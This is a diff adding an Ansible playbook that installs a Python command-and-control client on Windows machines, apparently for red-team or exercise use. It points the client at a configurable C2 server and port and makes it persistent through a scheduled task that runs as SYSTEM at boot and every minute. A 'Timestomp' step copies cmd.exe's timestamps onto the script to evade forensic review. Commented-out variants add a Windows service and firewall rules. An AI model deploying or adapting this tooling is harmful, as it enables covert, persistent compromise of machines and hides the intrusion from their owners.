@@ -1,0 +1,175 @@
+---
+- name: Ensure destination directory exists on Windows
+  ansible.windows.win_file:
+    path: "C:\\Temp"
+    state: directory
+    recurse: yes
+    
+- name: Download Python installer
+  win_get_url:
+    url: "https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe"
+    dest: "C:\\Temp\\python-installer.exe"
+
+- name: Install Python silently
+  win_package:
+    path: "C:\\Temp\\python-installer.exe"
+    arguments: /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
+    product_id: "Python 3.11.8 (64-bit)"
+    creates_path: "C:\\Program Files\\Python311\\python.exe"
+
+- name: Remove the Python installer
+  win_file:
+    path: "C:\\Temp\\python-installer.exe"
+    state: absent
+
+- name: Install cryptography using pip
+  ansible.windows.win_shell: |
+    '"C:\Program Files\Python311\Scripts\pip.exe" install cryptography'
+
+#- name: Ensure destination directory exists on Windows
+#  ansible.windows.win_file:
+#    path: "{{ pyc2_client_location_win | dirname }}"
+#    state: directory
+#    recurse: yes
+
+- name: Copy Python client script
+  win_copy:
+    src: "files/client.py"
+    dest: "{{ pyc2_client_location_win }}"
+
+# Need to do this as separate tasks
+- name: Update TIMEOUT value
+  community.windows.win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^TIMEOUT_TIME=.*'
+    line: 'TIMEOUT_TIME={{ pyc2_timeout_time }}'
+    backrefs: yes
+
+- name: Update server IP
+  community.windows.win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^SERVER=.*'
+    line: 'SERVER="{{ pyc2_server }}"'
+    backrefs: yes
+
+- name: Update server port
+  community.windows.win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^SERVER_PORT=.*'
+    line: 'SERVER_PORT={{ pyc2_port }}'
+    backrefs: yes
+
+- name: Update server port range
+  community.windows.win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^PORT_RADIUS=.*'
+    line: 'PORT_RADIUS={{ pyc2_port_range }}'
+    backrefs: yes
+
+- name: Update firewall name
+  community.windows.win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^FIREWALL_NAME=.*'
+    line: 'FIREWALL_NAME="{{ pyc2_firewall_name }}"'
+    backrefs: yes
+
+- name: Update DEBUG value
+  community.windows.win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^DEBUG=.*'
+    line: 'DEBUG={{ pyc2_debug }}'
+    backrefs: yes
+
+- name: Update BUFFER value
+  community.windows.win_lineinfile:
+    path: "{{ pyc2_client_location_win }}"
+    regexp: '^BUFFER_SIZE=.*'
+    line: 'BUFFER_SIZE={{ pyc2_buffer_size }}'
+    backrefs: yes
+
+#- name: Create the Windows service using PowerShell
+#  win_shell: |
+#    $svcName = "{{ pyc2_service_name }}"
+#    $scriptPath = "{{ pyc2_client_location_win }}"
+#    $pythonPath = "C:\Program Files\Python311\python.exe"
+#
+#    if (-not (Get-Service -Name $svcName -ErrorAction SilentlyContinue)) {
+#        New-Service -Name $svcName `
+#                    -BinaryPathName "`"$pythonPath`" `"$scriptPath`"" `
+#                    -DisplayName "{{ pyc2_service_name }}" `
+#                    -Description "{{ pyc2_service_description }}" `
+#                    -StartupType Automatic
+#    }
+#  args:
+#    executable: powershell
+#- name: Start the service
+#  win_service:
+#    name: "{{ pyc2_service_name }}"
+#    state: started
+#    start_mode: auto
+
+- name: Schedule Python script execution
+  community.windows.win_scheduled_task:
+    name: "{{ pyc2_task_name_win }}"
+    description: "{{ pyc2_task_desc_win }}"
+    actions:
+      - path: "C:\\Program Files\\Python311\\python.exe"
+        arguments: "{{ pyc2_client_location_win }}"
+        working_directory: C:\
+    triggers:
+      - type: boot
+        #start_boundary: '2025-04-11T00:00:00'
+        #start_boundary: "{{ ansible_date_time + (('2000-01-01 00:01:00' | to_datetime) - ('2000-01-01 00:00:00' | to_datetime)) }}"
+        repetition:
+          interval: PT1M
+          #duration: P3D
+    username: SYSTEM
+    run_level: highest
+    multiple_instances: 2
+    state: present
+
+- name: Run the scheduled task immediately
+  win_shell: schtasks /run /tn "{{ pyc2_task_name_win }}"
+# Define the action to run the Python script
+#$Action = New-ScheduledTaskAction -Execute 'C:\Program Files\Python311\python.exe' -Argument 'C:\script.py'
+
+# Define the trigger to start the task one minute from now and repeat every minute indefinitely
+#$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
+#$Trigger.RepetitionInterval = New-TimeSpan -Minutes 1
+#$Trigger.RepetitionDuration = [TimeSpan]::MaxValue
+
+# Define the task settings to prevent multiple instances
+#$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -StopIfGoingOnBatteries -DontStartNewIfRunning
+
+# Register the scheduled task to run under the SYSTEM account with highest privileges
+#Register-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings -TaskName 'RunPythonScript' -Description 'Executes the Python script directly' -User 'SYSTEM' -RunLevel Highest
+
+- name: Timestomp script to match cmd.exe
+  win_shell: |
+    $timestamp = (Get-Item 'C:\Windows\System32\cmd.exe').CreationTime
+    (Get-Item '{{ pyc2_client_location_win }}').CreationTime = $timestamp
+    (Get-Item '{{ pyc2_client_location_win }}').LastWriteTime = $timestamp
+    (Get-Item '{{ pyc2_client_location_win }}').LastAccessTime = $timestamp
+  args:
+    executable: powershell
+
+# Firewall handled in client script
+#- name: Allow inbound traffic on port through Windows firewall
+#  win_firewall_rule:
+#    name: "{{ pyc2_firewall_name }}"
+#    enable: yes
+#    direction: in
+#    localport: any
+#    remoteport: "{{ pyc2_port }}"
+#    protocol: TCP
+#    action: allow
+
+#- name: Allow outbound traffic on port through Windows firewall
+#  win_firewall_rule:
+#    name: "{{ pyc2_firewall_name }}"
+#    enable: yes
+#    direction: out
+#    localport: any
+#    remoteport: "{{ pyc2_port }}"
+#    protocol: TCP
+#    action: allow
